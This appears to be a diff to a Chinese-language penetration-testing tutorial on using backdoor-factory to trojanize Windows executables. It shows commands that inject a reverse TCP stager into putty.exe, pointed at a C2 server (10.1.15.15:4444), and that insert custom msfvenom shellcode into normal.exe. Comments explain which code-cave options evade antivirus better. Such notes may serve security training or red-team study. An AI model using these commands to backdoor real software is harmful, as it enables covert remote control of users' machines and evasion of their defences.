@@ -55,16 +55,27 @@ backdoor-factory -f putty.exe -s show
 
 
 # 4. 插入payload
+#
+#   【1】插入payload  -  自带的8种常用的payload)
 #    插入 本工具自带的某种具体的payload(这里是iat_reverse_tcp_stager_threaded)  -H指定C2服务器IP -P指定C2服务器端口
 #    以下Patch方式可选(默认Patch方式为手动Patch.  使用参数 -m automatic 即可指定为自动Patch)
-#    [4-1] 手动Patch(backdoor-factory将提示你手动选择 代码缝隙的数量和大小)
+#
+#    [4-1-1] 手动Patch(backdoor-factory将提示你手动选择 代码缝隙的数量和大小)
 #        (1)如果 使用-J参数:将shellcode保存到>1个代码缝隙 - 如果shellcode过大可以用这个方式 且具有更好的免杀效果
 #        (2)如果 不加-J参数:将shellcode保存到=1个代码缝隙 - 选择某1个可用的代码缝隙(code cave) 理论上选哪个都可以
 #        (3)如果 使用-a参数:将新section添加到exe中 - 更容易成功 但免杀效果差   使用-a参数的同时常常使用 -n name 指定新的section的名字（长度必须小于7个字符）
-#    [4-2] 自动Patch(backdoor-factory将判断并自动选择 代码缝隙的数量和大小)
+#
+#    [4-1-2] 自动Patch(backdoor-factory将判断并自动选择 代码缝隙的数量和大小)
 #        backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.1.15.15 -P 4444 -o evil.exe -m automatic
 
 backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.1.15.15 -P 4444 -o evil.exe -J
+
+
+
+#   【2】插入payload  -  用工具或手工构造 自定义的payload
+#    msfvenom -p windows/messagebox -f raw >msg.bin
+#    将自定义代码插入normal.exe 生成evil.exe
+backdoor-factory -f normal.exe -s user_supplied_shellcode_threaded -U msg.bin -o evil.exe
 ```
 
 
